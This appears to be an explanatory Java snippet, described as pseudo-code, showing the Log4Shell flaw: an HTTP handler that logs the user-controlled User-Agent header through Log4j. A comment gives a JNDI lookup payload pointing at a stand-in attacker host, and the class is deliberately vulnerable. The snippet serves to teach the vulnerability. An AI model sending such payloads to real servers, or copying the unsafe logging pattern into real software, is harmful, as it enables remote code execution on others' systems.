import org.apache.logging.log4j.LogManager;

import org.apache.logging.log4j.Logger;

 

import java.io.*;

import java.sql.SQLException;

import java.util.*;

 

public class VulnerableLog4jExampleHandler implements HttpHandler {

 

  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());

 

  /**

   * A simple HTTP endpoint that reads the request's User Agent and logs it back.

   * This is basically pseudo-code to explain the vulnerability, and not a full example.

   * @param he HTTP Request Object

   */

  public void handle(HttpExchange he) throws IOException {

    String userAgent = he.getRequestHeader("user-agent");

 

    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.

    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}

    log.info("Request User Agent:{}", userAgent);

 

    String response = "Hello There, " + userAgent + "!";

    he.sendResponseHeaders(200, response.length());

    OutputStream os = he.getResponseBody();

    os.write(response.getBytes());

    os.close();

  }

}